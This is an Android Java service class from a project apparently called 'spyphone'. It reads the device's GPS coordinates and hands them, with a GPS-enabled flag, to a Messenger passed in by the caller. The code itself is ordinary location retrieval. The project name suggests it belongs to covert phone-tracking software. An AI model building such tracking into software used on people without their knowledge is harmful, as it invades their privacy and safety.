package emit.esy.es.spyphone.services;

import android.app.IntentService;
import android.content.Intent;
import android.os.Bundle;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

import emit.esy.es.spyphone.interfaces.ServiceResponse;
import emit.esy.es.spyphone.util.GPSHelper;

/**
 * Created by Emil Makovac on 26/04/2015.
 */
public class LocationService extends IntentService implements ServiceResponse{

    Double latitude, longitude;

    private static final String LOG_TAG = "LocationService";
    private boolean isGPSEnabled;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */

    public LocationService(String name) {
        super(name);
    }

    public LocationService() {
        super(LOG_TAG);
    }



    @Override
    protected void onHandleIntent(Intent intent) {
        Log.d(LOG_TAG, "onHandleIntent");

        GPSHelper gpsHelper = new GPSHelper(this);
        gpsHelper.getMyLocation();
        isGPSEnabled = gpsHelper.isGPSenabled();

        latitude = gpsHelper.getLatitude();
        longitude = gpsHelper.getLongitude();

        if(latitude != null && longitude != null){
            onWorkDone(intent);
        }

    }

    @Override
    public void onWorkDone(Intent intent) {
        Log.d(LOG_TAG, "LAT: " + latitude.toString() + ", LNG: " + longitude.toString());
        Bundle bundle = intent.getExtras();
        Bundle data = new Bundle();
        data.putString("action", "cords");
        data.putDoubleArray("content", new double[]{latitude, longitude});
        data.putBoolean("gpsEnabled", isGPSEnabled);
        if (bundle != null) {
            Messenger messenger = (Messenger) bundle.get("messenger");
            Message msg = Message.obtain();
            msg.setData(data);//put the data here
            try {
                messenger.send(msg);
            } catch (RemoteException e) {
                Log.i("error", "error");
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(LOG_TAG, "onDestroy");
    }

}
